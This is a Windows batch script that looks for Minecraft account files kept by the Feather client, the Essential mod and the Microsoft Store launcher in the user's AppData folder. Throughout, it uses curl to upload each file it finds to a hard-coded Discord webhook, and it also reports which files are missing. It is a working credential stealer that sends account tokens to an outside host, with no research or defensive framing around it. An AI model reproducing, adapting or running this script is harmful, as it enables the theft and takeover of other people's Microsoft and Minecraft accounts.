@echo off
:: Define the file paths relative to %AppData%
set "feather_file=%AppData%\.feather\accounts.json"
set "essential_file=%AppData%\.minecraft\essential\microsoft_accounts.json"
set "minecraft_file=%AppData%\.minecraft\launcher_accounts_microsoft_store.json"

:: Define the Discord webhook URL
set "webhook_url=https://discord.com/api/webhooks/1345577260882726982/17LGyKkGMw6pN_6OOu2c6fDfnDebWCVeo814qLDWQSjUQzbaEznGggnCPbeSOxpb57nj"

:: Initialize variables for missing files
set "discord_message=Missing files:"

:: Check and send Feather accounts file
if exist "%feather_file%" (
    echo Sending Feather Accounts File: %feather_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@\"%feather_file%\"" ^
        -F "content=Feather Accounts File"
) else (
    echo Feather Accounts File not found: %feather_file%
    set "discord_message=%discord_message%^n- Feather Accounts File"
)

:: Check and send Essentials accounts file
if exist "%essential_file%" (
    echo Sending Essentials Accounts File: %essential_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@\"%essential_file%\"" ^
        -F "content=Essentials Accounts File"
) else (
    echo Essentials Accounts File not found: %essential_file%
    set "discord_message=%discord_message%^n- Essentials Accounts File"
)

:: Check and send Minecraft launcher accounts file
if exist "%minecraft_file%" (
    echo Sending Minecraft Launcher Accounts File: %minecraft_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@\"%minecraft_file%\"" ^
        -F "content=Minecraft Launcher Accounts File"
) else (
    echo Minecraft Launcher Accounts File not found: %minecraft_file%
    set "discord_message=%discord_message%^n- Minecraft Launcher Accounts File"
)

:: Send a message to the webhook if any files are missing
if not "%discord_message%"=="Missing files:" (
    echo Sending missing files message to Discord webhook
    setlocal enabledelayedexpansion
    set "discord_message=!discord_message:\n=!"
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: application/json" ^
        -d "{\"content\": \"!discord_message!\"}"
    endlocal
)

echo Process complete!
pause
